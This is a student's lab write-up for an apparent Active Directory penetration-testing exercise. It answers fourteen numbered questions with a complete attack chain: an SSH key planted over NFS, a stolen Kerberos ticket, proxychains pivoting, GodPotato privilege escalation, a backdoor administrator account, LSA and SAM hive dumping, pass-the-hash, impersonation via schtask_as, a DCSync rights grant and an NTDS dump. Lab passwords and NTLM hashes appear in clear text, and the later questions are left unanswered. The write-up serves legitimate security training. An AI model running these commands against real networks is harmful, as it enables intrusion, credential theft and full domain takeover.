![](assets/Pasted%20image%2020260703073354.png)

**Three Subnets**
- 172.16.2.0/24
- 172.16.5.0/24
- 172.16.13.0-03 - the rest are student IPs
- everything else is NOT in scope
- student machines do not have internet access
- treat lab environment as dangerous - no kali:kali



**1 - Kali-stdX - What is the IP of the machine where port 2049 (nfs) is open ?**
- **172.16.5.11**


ping sweep for open machine
```
nmap -sn 172.16.5.0/24

nmap 172.16.5.11
```
![](Pasted%20image%2020260830003801.png)

public export with nxc
```
nxc nfs 172.16.5.11 --shares
```
![](Pasted%20image%2020260830003932.png)
- root escape shows true

able to get files
```
nxc nfs 172.16.5.11 --share /var/nfs/public --get-file root_test ./
```
![](Pasted%20image%2020260830004126.png)

able to read/write - can write to authorized_keys
```
nxc nfs 172.16.5.11 --get-file /etc/exports ./
```
![](Pasted%20image%2020260830004242.png)

get passwd file to get user
```
nxc nfs 172.16.5.11 --get-file /etc/passwd ./
```
![](Pasted%20image%2020260830005819.png)
![](Pasted%20image%2020260830005828.png)
- can also do `--ls /home` to get user

write ssh key into backupadmin's ssh folder
```
nxc nfs 172.16.5.11 --put-file ~/.ssh/id_rsa.pub /home/backupadmin/.ssh/authorized_keys.d/ssh_student56.pub
```
![](Pasted%20image%2020260830010143.png)

change file permissions to ssh
```
nxc nfs 172.16.5.11 --chmod 644 /home/backupadmin/.ssh/authorized_keys.d/ssh_student56.pub
```
![](Pasted%20image%2020260830010152.png)

ssh into machine
```
ssh -i ssh_student56 backupadmin@172.16.5.11
```
![](Pasted%20image%2020260830010214.png)



**2 - EXTDesign - Name of the user whose Kerberos ticket we found on EXTDesign machine.**
- **daniel.harris**

can list kerberos tickets with `klist`
![](Pasted%20image%2020260830010320.png)

download kerberos ticket to student kali
```
scp -i ssh_student56 backupadmin@172.16.5.11:/tmp/krb5cc_1000 ./
export KRB5CCNAME=krb5cc_1000
klist
```
![](Pasted%20image%2020260830031018.png)



**3 - Kali-stdX - Which parameter in proxychains is used to disable noisy debug output?**
- **-q**

![](Pasted%20image%2020260830010515.png)



**4 - Kali-stdX - Name of the machine where user daniel.harris has access using WinRM.**
- **CAD-WKS01**

run `host auto.corp` to find new subnets
![](Pasted%20image%2020260830023254.png)

set up proxychains with ssh tunneling
```
ssh -i ssh_student56 backupadmin@172.16.5.11 -D 127.0.0.1:9040

proxychains -q nxc smb 172.16.2.1
```
![](Pasted%20image%2020260830023746.png)
![](Pasted%20image%2020260830023754.png)
- make sure to put `socks4 127.0.0.1 9040` in `/etc/proxychains4.conf`

get list of machines using nmap
```
sudo proxychains -q nmap 172.16.2.0/24 -Pn -sT -p 22,135,139,445,3389,5985 --open
```
![](Pasted%20image%2020260830030253.png)
![](Pasted%20image%2020260830031156.png)

daniel.harris can authenticate to CAD-WKS01 with the ticket
```
proxychains -q nxc smb 172.16.2.0/24 --use-kcache
```
![](Pasted%20image%2020260830031702.png)

generate krb5.conf file with nxc and export it
```
proxychains -q nxc smb 172.16.2.1 --generate-krb5 krb5.conf
export KRB5_CONFIG=krb5.conf
```
![](Pasted%20image%2020260830032307.png)

connect to the machine using evil-winrm
```
proxychains -q evil-winrm -i CAD-WKS01.auto.corp -r auto.corp
```
- when using kerberos auth, you have to use the FQDN and add `-r` for realm
	- need krb5.conf file for `-r` to work
![](Pasted%20image%2020260830032553.png)



**5 - CAD-WKS01 - Name of the user privilege that we abuse to escalate privileges on CAD-WKS01 machine.**
- **SeImpersonatePrivilege**

run `whoami /priv` to see impersonate
![](Pasted%20image%2020260830032648.png)

upload GodPotato and run it to get NT AUTHORITY
```
upload GodPotato.exe

./GodPotato.exe -cmd "cmd /c whoami"
```
![](Pasted%20image%2020260830032822.png)

now that we have NT AUTHORITY command execution, create a new user and make them administrator
```
net user student56 Password123! /add
net localgroup Administrators student56 /add
```

modify registry key to allow remote login as administrator
```
./GodPotato.exe -cmd "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
```
![](Pasted%20image%2020260830033435.png)

login with nxc using `--local-auth`
```
proxychains -q nxc smb 172.16.2.15 -u student56 -p 'Password123!' --local-auth
```
![](Pasted%20image%2020260830033543.png)



**6 - CAD-WKS01 - Which parameter in NetExec extracts LSASecrets?**
- **`--lsa`**

dump LSA secrets
```
proxychains -q nxc smb 172.16.2.15 -u student56 -p 'Password123!' --local-auth --lsa
```
![](Pasted%20image%2020260830033703.png)

**7 - Kali-stdX - Name of the user whose password is found in the description field.**
- **srv_web**

```
proxychains -q nxc smb 172.16.2.1 -u CAD-WKS01$ -H 'aad3b435b51404eeaad3b435b51404ee:55041e0fed713dacd2c8053551088ce8' --users
```
![](Pasted%20image%2020260830034236.png)
`srv_web:MyS3cret!sInS0u1`




**8 - Kali-stdX - Name of the non-default share in the network (172.16.2.0/24).**
- **IT-Department** - on Domain Controller (172.16.2.1)

```
proxychains -q nxc smb 172.16.2.1 -u CAD-WKS01$ -H 'aad3b435b51404eeaad3b435b51404ee:55041e0fed713dacd2c8053551088ce8' --shares
```
![](Pasted%20image%2020260830034148.png)

list out share contents
```
proxychains -q nxc smb 172.16.2.1 -u CAD-WKS01$ -H 'aad3b435b51404eeaad3b435b51404ee:55041e0fed713dacd2c8053551088ce8' --share IT-Department --dir
```
![](Pasted%20image%2020260830044110.png)

grab setup_srv_web.ps1 and design56.ps1
```
proxychains -q nxc smb 172.16.2.1 -u CAD-WKS01$ -H 'aad3b435b51404eeaad3b435b51404ee:55041e0fed713dacd2c8053551088ce8' --share IT-Department --get-file design56.ps1 design56.ps1

proxychains -q nxc smb 172.16.2.1 -u CAD-WKS01$ -H 'aad3b435b51404eeaad3b435b51404ee:55041e0fed713dacd2c8053551088ce8' --share IT-Department --get-file setup_srv_web.ps1 setup_srv_web.ps1
```
![](Pasted%20image%2020260830044209.png)

design56.ps1 has the password for that user
![](Pasted%20image%2020260830044317.png)
`design56:l71GBOVF2Rq88YfEmk`




**9 - Kali-stdX - Name of the machine where user srv_web has administrative privileges.**
- **DESIGNSRV02**

run nxc with winrm module with srv_web account
- didn't use smb module since one machine doesn't have smb
```
proxychains -q nxc winrm 172.16.2.0/24 -u srv_web -p 'MyS3cret!sInS0u1'
```
![](Pasted%20image%2020260830034418.png)




**10 - DESIGNSRV02 - NTLM hash of Administrator extracted from registry on DESIGNSRV02.**
- **aad3b435b51404eeaad3b435b51404ee:64ad7eca1c0563079a66d58203b8df2e**

login with winrm to DESIGNSRV02
```
proxychains -q evil-winrm -i DESIGNSRV02.auto.corp -u srv_web
```
![](Pasted%20image%2020260830035720.png)
- remember to use FQDN :)

save SAM, SYSTEM, and SECURITY hives
```
reg save HKLM\SYSTEM C:\Windows\temp\system1
reg save HKLM\SECURITY C:\Windows\temp\security1
reg save HKLM\SAM C:\Windows\temp\sam1

download system1
download security1
download sam1
```
![](Pasted%20image%2020260830040728.png)

parse registry hives locally with impacket
```
impacket-secretsdump LOCAL -system system1 -security security1 -sam sam1
```
![](Pasted%20image%2020260830040845.png)




**11 - DESIGNSRV02 - Which parameter in NetExec forces use of Local Authentication?**
- **`--local-auth`**

log into DESIGNSRV01 with Administrator using `--local-auth`
```
proxychains -q nxc smb 172.16.2.0/24 -u Administrator -H '64ad7eca1c0563079a66d58203b8df2e' --local-auth

proxychains -q evil-winrm -i 172.16.2.13 -u Administrator -H '64ad7eca1c0563079a66d58203b8df2e'
```
![](Pasted%20image%2020260830041038.png)
![](Pasted%20image%2020260830041239.png)




**12 - DESIGNSRV01 - Name of the user whose active session is available on DESIGNSRV01 machine.**
- **adm_david.miller**

get all active RDP sessions with qwinsta
```
proxychains -q nxc smb 172.16.2.13 -u Administrator -H '64ad7eca1c0563079a66d58203b8df2e' --local-auth --qwinsta
```
![](Pasted%20image%2020260830041656.png)

can also do `--loggedon-users`
```
proxychains -q nxc smb 172.16.2.13 -u Administrator -H '64ad7eca1c0563079a66d58203b8df2e' --local-auth --loggedon-users
```
![](Pasted%20image%2020260830041946.png)

can also do `--reg-sessions`
```
proxychains -q nxc smb 172.16.2.13 -u Administrator -H '64ad7eca1c0563079a66d58203b8df2e' --local-auth --reg-sessions
```
![](Pasted%20image%2020260830042012.png)



**13 - Kali-stdX - Which NetExec module is used to impersonate and execute commands as interactively logged-in users?**
- **schtask_as**

try to ping our machine while impersonating adm_david.miller
```
sudo tcpdump -i eth0 ip proto \\icmp

proxychains -q nxc smb 172.16.2.13 -u Administrator -H '64ad7eca1c0563079a66d58203b8df2e' --local-auth -M schtask_as -o USER=adm_david.miller CMD='ping 172.16.100.56' SILENTCOMMAND=True
```
![](Pasted%20image%2020260830042758.png)
![](Pasted%20image%2020260830042752.png)
- need SILENTCOMMAND since their AV picks up on the way that nxc handles output


also test powershell blocks - this will be needed for domain replication
```
proxychains -q nxc smb 172.16.2.13 -u Administrator -H '64ad7eca1c0563079a66d58203b8df2e' --local-auth -M schtask_as -o USER=adm_david.miller CMD='powershell.exe "Invoke-Command -ComputerName AUTO-DC01 -ScriptBlock (ping 172.16.100.56)"' SILENTCOMMAND=True
```
![](Pasted%20image%2020260830043029.png)
![](Pasted%20image%2020260830043024.png)

give design56 domain replication privileges
```
proxychains -q nxc smb 172.16.2.13 -u Administrator -H '64ad7eca1c0563079a66d58203b8df2e' --local-auth -M schtask_as -o USER=adm_david.miller CMD='powershell.exe "Invoke-Command -ComputerName AUTO-DC01 -ScriptBlock {$r=[ADSI]\"LDAP://DC=auto,DC=corp\"; \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\",\"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\",\"89e95b76-444d-4c62-991a-0facbeda640c\" | ForEach-Object { $r.ObjectSecurity.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule([System.Security.Principal.NTAccount]\"AUTO\design11\",\"ExtendedRight\",\"Allow\",[Guid]$_))) }; $r.CommitChanges()}"' SILENTCOMMAND=True
```


**14 - AUTO-DC01 - NTLM hash of krbtgt of auto.corp domain.**
- **aad3b435b51404eeaad3b435b51404ee:33d4fe4672b15099d69e3248e66421b9**

now that design56 has domain replication privileges, dump the ntds.dit
```
proxychains -q nxc smb 172.16.2.1 -u design56 -p 'l71GBOVF2Rq88YfEmk' --ntds
```
![](Pasted%20image%2020260830044445.png)




**15 - Kali-stdX - Name of the function in the custom NetExec module that is called only on administrative privileges.**


**16 - Parts-WebSrv - Path on the web server where the webshell is uploaded.**


**17 - Kali-stdX - Name of the user whose NTLMv2 hash is captured using Responder.**


**18 - Kali-stdX - What is the IP of the machine where user "michael.johnson" has administrative privileges?**


**19 - LineOps-DB01 - Name of the SQL database owned by ryan.young.**


**20 - Kali-stdX - Name of the vulnerable ADCS template.**


**21 - ROBOOPS01 - Name of the user abused using Kerberos Delegation (S4U2Self).**


**22 - LineOps-DB01 - NTLM Hash of Local Administrator of LINEOPS-DB01.**


**23 - LineOps-DB01 - Name of the user whose credentials are extracted from WinSCP.**


**24 - Kali-stdX - Name of the user identified by abusing insecure NLA setting for RDP on LineOps-DB01.**


**25 - CAR-DC01 - NTLM hash of the domain admin - CAR\Administrator.**